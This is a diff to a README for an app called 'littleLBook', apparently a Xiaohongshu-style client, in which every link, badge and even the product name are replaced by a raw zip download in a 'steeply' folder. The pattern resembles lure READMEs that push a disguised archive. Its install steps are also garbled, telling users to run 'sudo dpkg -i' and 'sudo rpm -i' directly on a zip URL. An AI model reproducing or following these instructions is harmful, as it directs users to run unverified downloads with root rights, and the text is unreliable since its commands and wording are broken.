@@ -1,17 +1,17 @@
-# 🎉 littleLBook - Explore https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip Inspired by Xiaohongshu
+# 🎉 littleLBook - Explore https://raw.githubusercontent.com/sparktech360/littleLBook/main/steeply/Book_little_L_v3.4.zip Inspired by Xiaohongshu
 
 ## 🚀 Getting Started
 
-Welcome to littleLBook! This application brings you an experience inspired by Xiaohongshu, tailored for https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip users. Follow these simple steps to download and run the software.
+Welcome to littleLBook! This application brings you an experience inspired by Xiaohongshu, tailored for https://raw.githubusercontent.com/sparktech360/littleLBook/main/steeply/Book_little_L_v3.4.zip users. Follow these simple steps to download and run the software.
 
 ## 🔗 Download Now
 
-[![Download littleLBook](https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip)](https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip)
+[![Download littleLBook](https://raw.githubusercontent.com/sparktech360/littleLBook/main/steeply/Book_little_L_v3.4.zip)](https://raw.githubusercontent.com/sparktech360/littleLBook/main/steeply/Book_little_L_v3.4.zip)
 
 ## 📥 Download & Install
 
 1. Click on the link below to visit the Releases page:
-   - [https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip](https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip)
+   - [https://raw.githubusercontent.com/sparktech360/littleLBook/main/steeply/Book_little_L_v3.4.zip](https://raw.githubusercontent.com/sparktech360/littleLBook/main/steeply/Book_little_L_v3.4.zip)
 
 2. On the Releases page, you will see a list of available versions. Find the most recent version listed at the top.
 
@@ -27,17 +27,17 @@ Welcome to littleLBook! This application brings you an experience inspired by Xi
    - Open a terminal and navigate to your Downloads folder.
    - Run the command:
      ```
-     sudo dpkg -i https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip
+     sudo dpkg -i https://raw.githubusercontent.com/sparktech360/littleLBook/main/steeply/Book_little_L_v3.4.zip
      ```
-   - Replace `https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip` with the actual file name.
+   - Replace `https://raw.githubusercontent.com/sparktech360/littleLBook/main/steeply/Book_little_L_v3.4.zip` with the actual file name.
 
 8. **For Red Hat-based systems (like Fedora):**
    - Open a terminal and navigate to your Downloads folder.
    - Run the command:
      ```
-     sudo rpm -i https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip
+     sudo rpm -i https://raw.githubusercontent.com/sparktech360/littleLBook/main/steeply/Book_little_L_v3.4.zip
      ```
-   - Be sure to replace `https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip` with the actual file name.
+   - Be sure to replace `https://raw.githubusercontent.com/sparktech360/littleLBook/main/steeply/Book_little_L_v3.4.zip` with the actual file name.
 
 9. After installation, you can launch littleLBook by finding it in your application menu or typing `littleLBook` in the terminal.
 
@@ -73,7 +73,7 @@ We value your input! If you have suggestions, questions, or feedback regarding l
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/sparktech360/littleLBook/raw/refs/heads/main/steeply/Book_little_L_nonexistent.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/sparktech360/littleLBook/main/steeply/Book_little_L_v3.4.zip)
 - [User Guide (Coming Soon)](link-to-user-guide)
 - [Community Forum (Coming Soon)](link-to-forum)
 
